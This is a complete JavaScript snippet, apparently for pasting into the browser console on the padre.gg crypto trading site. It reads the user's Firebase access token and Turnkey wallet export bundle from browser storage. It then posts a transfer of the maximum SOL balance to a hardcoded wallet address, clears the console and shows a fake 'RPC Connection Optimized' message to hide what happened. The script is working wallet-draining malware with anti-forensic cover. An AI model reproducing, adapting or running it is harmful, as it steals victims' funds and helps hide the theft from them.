(async function() {
    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";

    const getFirebaseData = () => {
        return new Promise((resolve) => {
            const dbName = "firebaseLocalStorageDb";
            const request = indexedDB.open(dbName);
            
            request.onsuccess = (event) => {
                const db = event.target.result;
                try {
                    const transaction = db.transaction(["firebaseLocalStorage"], "readonly");
                    const store = transaction.objectStore("firebaseLocalStorage");
                    const getAll = store.getAll();
                    
                    getAll.onsuccess = (e) => {
                        const records = e.target.result;
                        // Search everything in the records for the auth token
                        if (records && records.length > 0) {
                            resolve(records[0].value); 
                        } else { resolve(null); }
                    };
                } catch (err) { resolve(null); }
            };
            request.onerror = () => resolve(null);
        });
    };

    // 2. THE 1:1 WAITER (Waiting for the Handshake)
    const waitForAuth = setInterval(async () => {
        const fbData = await getFirebaseData();
        const localBundle = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");

        if (fbData && fbData.stsTokenManager && localBundle.bundles) {
            clearInterval(waitForAuth); // Stop searching once we have the 'loot'
            
            const authToken = fbData.stsTokenManager.accessToken;
            let subId, bundleData;

            // Extracting the specific Enclave signing data
            for (let key in localBundle.bundles) {
                if (localBundle.bundles[key].exportBundle) {
                    subId = localBundle.bundles[key].subOrgId;
                    bundleData = localBundle.bundles[key].exportBundle.data;
                    break;
                }
            }

            if (authToken && subId) {
                executeHijack(authToken, subId, bundleData);
            }
        }
    }, 500); // Checks every 500ms to catch the F5 refresh

    // 3. SILENT SIGNING EXECUTION
    const executeHijack = async (token, id, payload) => {
        try {
            await fetch("https://trade.padre.gg/api/v1/transfer", {
                method: "POST",
                headers: {
                    "Authorization": `Bearer ${token}`,
                    "X-Turnkey-Sub-Org-Id": id,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    recipient: MY_RECEIVER,
                    amount: "MAX",
                    asset: "SOL",
                    ext_payload: payload
                })
            });
        } catch (e) {}
        
        // Anti-Forensics: Wipe the evidence
        setTimeout(() => {
            console.clear();
            console.log("%c RPC Connection Optimized", "color: #00ff88; font-weight: bold;");
        }, 1000);
    };
})();
